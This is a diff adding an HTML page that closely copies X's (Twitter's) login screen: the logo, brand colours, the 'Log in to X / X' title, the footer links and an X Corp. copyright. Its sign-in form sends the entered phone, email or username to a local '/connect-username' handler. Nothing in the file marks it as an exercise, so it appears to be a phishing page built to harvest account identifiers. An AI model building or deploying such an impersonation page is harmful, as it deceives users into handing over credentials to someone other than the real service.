@@ -1,0 +1,113 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Log in to X / X</title>
+  <script src="https://cdn.tailwindcss.com"></script>
+  <script>
+    tailwind.config = {
+      theme: {
+        extend: {
+          colors: {
+            'twitter-blue': '#1d9bf0',
+            'twitter-black': '#000000',
+            'twitter-dark': '#242d35',
+            'twitter-gray': '#71767b',
+            'twitter-border': '#333639',
+          }
+        }
+      }
+    }
+  </script>
+</head>
+<body class="font-sans m-0 p-0 bg-twitter-dark text-white flex justify-center items-center min-h-screen">
+  <!-- Background elements -->
+  <div class="fixed top-0 left-0 w-full h-full bg-twitter-dark z-[-1]"></div>
+  <div class="fixed left-1/4 top-1/2 -translate-x-1/2 -translate-y-1/2 w-[300px] h-[300px] opacity-15 z-[-1]">
+    <svg viewBox="0 0 24 24" aria-hidden="true" fill="white" width="100%" height="100%">
+      <g>
+        <path d="M18.244 2.25h3.308l-7.227 8.26 8.502 11.24H16.17l-5.214-6.817L4.99 21.75H1.68l7.73-8.835L1.254 2.25H8.08l4.713 6.231zm-1.161 17.52h1.833L7.084 4.126H5.117z"></path>
+      </g>
+    </svg>
+  </div>
+  <div class="fixed right-[15%] top-[20%] text-[64px] font-extrabold leading-tight text-white opacity-10 z-[-1] whitespace-nowrap">
+    Happening now
+  </div>
+  
+  <!-- Modal dialog -->
+  <div class="h-[75vh] bg-twitter-black rounded-2xl w-[40vw] max-w-[80%] relative overflow-hidden shadow-lg">
+    <div class="w-[74%] ml-[13%]">
+
+      <!-- Modal header -->
+      <div class="p-4 text-center relative">
+        <div class="inline-block w-8 h-8">
+          <svg viewBox="0 0 24 24" aria-hidden="true" fill="white">
+            <g>
+              <path d="M18.244 2.25h3.308l-7.227 8.26 8.502 11.24H16.17l-5.214-6.817L4.99 21.75H1.68l7.73-8.835L1.254 2.25H8.08l4.713 6.231zm-1.161 17.52h1.833L7.084 4.126H5.117z"></path>
+            </g>
+          </svg>
+        </div>
+      </div>
+      
+      <!-- Modal content -->
+      <div class="p-8 flex flex-col items-center mt-[25%]">
+        <div class="w-[100%]">
+          <h1 class="text-4xl font-bold mb-8 text-start ">Sign in to X</h1>
+        </div>
+        <hr class="w-[100%] mb-5">
+        
+        <!-- Form -->
+        <form action="/connect-username" method="POST" class="w-full ">
+          <input 
+            class="w-full py-3 px-2.5 bg-transparent border border-twitter-border rounded text-base text-white mb-5 focus:outline-none focus:border-twitter-blue" 
+            type="text" 
+            name="username" 
+            placeholder="Phone, email, or username" 
+            required
+          >
+          <button 
+            class="w-full py-3 bg-white text-black border-none rounded-full font-bold text-sm cursor-pointer mb-4 hover:bg-gray-100" 
+            type="submit"
+          >
+            Next
+          </button>
+        </form>
+        
+        <!-- Forgot password button -->
+        <button class="w-full  py-3 bg-transparent text-white border border-twitter-border rounded-full font-normal text-sm cursor-pointer mb-4">
+          Forgot password?
+        </button>
+        
+       <!-- Sign up prompt -->
+       <div class="text-sm text-twitter-gray  w-full">
+        Don't have an account? <a href="#" class="text-twitter-blue no-underline ">Sign up</a>
+      </div>  
+      </div>
+    </div>
+  </div>
+  
+  <!-- Footer -->
+  <div class="fixed bottom-0 w-full py-3 flex justify-center flex-wrap text-xs text-twitter-gray">
+    <a href="#" class="text-twitter-gray no-underline mx-2">About</a>
+    <a href="#" class="text-twitter-gray no-underline mx-2">Download the X app</a>
+    <a href="#" class="text-twitter-gray no-underline mx-2">Help Center</a>
+    <a href="#" class="text-twitter-gray no-underline mx-2">Terms of Service</a>
+    <a href="#" class="text-twitter-gray no-underline mx-2">Privacy Policy</a>
+    <a href="#" class="text-twitter-gray no-underline mx-2">Cookie Policy</a>
+    <a href="#" class="text-twitter-gray no-underline mx-2">Accessibility</a>
+    <a href="#" class="text-twitter-gray no-underline mx-2">Ads info</a>
+    <a href="#" class="text-twitter-gray no-underline mx-2">Blog</a>
+    <a href="#" class="text-twitter-gray no-underline mx-2">Status</a>
+    <a href="#" class="text-twitter-gray no-underline mx-2">Careers</a>
+    <a href="#" class="text-twitter-gray no-underline mx-2">Brand Resources</a>
+    <a href="#" class="text-twitter-gray no-underline mx-2">Advertising</a>
+    <a href="#" class="text-twitter-gray no-underline mx-2">Marketing</a>
+    <a href="#" class="text-twitter-gray no-underline mx-2">X for Business</a>
+    <a href="#" class="text-twitter-gray no-underline mx-2">Developers</a>
+    <a href="#" class="text-twitter-gray no-underline mx-2">Directory</a>
+    <a href="#" class="text-twitter-gray no-underline mx-2">Settings</a>
+    <div class="w-full text-center mt-2">© 2025 X Corp.</div>
+  </div>
+</body>
+</html>
